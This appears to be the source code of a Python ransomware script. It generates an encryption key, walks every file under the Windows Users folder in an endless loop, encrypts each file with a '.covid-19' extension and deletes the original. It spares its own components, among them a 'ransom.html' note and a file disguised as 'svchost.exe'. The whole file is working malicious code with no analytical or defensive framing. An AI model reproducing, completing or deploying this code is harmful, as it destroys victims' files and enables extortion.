#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, base64

# ENVIRONMENT VARIABLE
letter_drive_path = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]

usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive_path, usr, usr)

# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)

# FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass

# CALL FUNCTION TO GENERATE KEY
genkey(usr)

# FOR EVERYTIME ENCRYPTING FILES
while True:
    # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                if not(file in my_files):
                    for ext in file.split("."):
                        if(file.endswith(ext)):
                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
                            if not(ext in my_ext):
                                try:
                                    ally = os.path.join(root, file)
                                    file_ecrypt(key, ally)
                                except PermissionError:
                                    pass
                                except:
                                    pass
